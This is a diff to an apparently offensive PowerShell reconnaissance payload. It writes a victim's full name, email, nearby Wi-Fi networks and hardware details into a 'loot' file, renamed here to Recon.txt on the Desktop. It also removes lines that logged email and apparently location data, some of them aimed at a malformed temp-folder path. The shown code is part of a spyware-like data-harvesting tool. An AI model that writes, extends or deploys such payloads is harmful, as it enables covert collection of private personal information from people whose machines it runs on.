@@ -163,7 +163,7 @@ $videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcess
 
 # MAKE LOOT FOLDER 
 
-$FileName = "$env:HOMEPATH\Desktop\test.txt"
+$FileName = "$env:HOMEPATH\Desktop\Recon.txt"
 
 ############################################################################################################################################################
 
@@ -176,11 +176,6 @@ echo $FN >> $FileName
 echo "" >> $FileName
 echo "Email:" >> $FileName
 echo "==================================================================" >> $FileName
-echo $EM >> $env:TMP\$FileName
-echo "" >> $env:TMP\$FileName
-echo "==================================================================" >> $FileName
-echo $GL >> $FileName
-echo "" >> $FileName
 echo "Nearby Wifi:" >> $FileName
 echo "==================================================================" >> $FileName
 echo $NearbyWifi >> $FileName
